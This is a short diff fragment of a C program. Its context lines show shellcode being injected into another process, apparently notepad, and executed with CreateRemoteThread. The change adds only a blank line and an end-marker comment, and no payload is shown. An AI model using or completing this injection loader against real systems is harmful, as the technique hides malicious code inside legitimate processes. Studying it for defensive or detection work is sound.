@@ -32,6 +32,7 @@ void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE
     //print the memeory address of the shellcode in human readable format
     printf("[+] Shellcode is located at: %p\n", lpAllocationStart);
     
+    
     // Creating a thread in the target process to execute the magiccode
 	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, 0, NULL);
 
@@ -105,6 +106,7 @@ int main(int argc, char *argv[])
         printf("[+] notepad PID: %d\n", pid);      
     }
 
+    //####END####
 
     SIZE_T magiccodeSize = sizeof(magiccode);
 
